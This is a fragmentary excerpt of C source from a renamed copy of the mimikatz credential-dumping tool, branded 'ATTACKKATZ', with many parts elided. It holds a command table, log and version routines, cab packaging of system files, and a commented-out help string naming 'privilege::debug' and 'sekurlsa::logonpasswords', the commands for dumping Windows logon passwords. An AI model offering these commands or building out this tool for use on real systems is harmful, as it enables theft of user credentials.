...
const KUHL_M_C kuhl_m_c_standard[] = {
	...
	//{kuhl_m_standard_help,		L"commands",	L"Display passwd dump commands"},
};
...
// Removed as it's a help menu
/*
NTSTATUS kuhl_m_standard_help(int argc, wchar_t* argv[])
{
	kprintf(L"0) privilege::debug\n1) sekurlsa::logonpasswords");
	return STATUS_SUCCESS;
}
*/
...
{
	PCWCHAR filename = (kull_m_string_args_byName(argc, argv, L"stop", NULL, NULL) ? NULL : (argc ? argv[0] : ATTACKKAT_DEFAULT_LOG));
...
NTSTATUS kuhl_m_standard_version(int argc, wchar_t * argv[])
{
	...
	{
		kprintf(
			L"\n" ATTACKKATZ L" " ATTACKKATZ_VERSION L" (arch " MIMIKATZ_ARCH L")\n"
	...
	if(kull_m_string_args_byName(argc, argv, L"cab", NULL, NULL))
	{
		...
		if(dwSystem = GetSystemDirectory(NULL, 0))
		{
			if(system = (wchar_t *) LocalAlloc(LPTR, dwSystem * sizeof(wchar_t)))
			{
				...
				{
					if(kull_m_string_sprintf(&cabname, ATTACKKATZ L"_" MIMIKATZ_ARCH L"_sysfiles_%u", MIMIKATZ_NT_BUILD_NUMBER))
					{
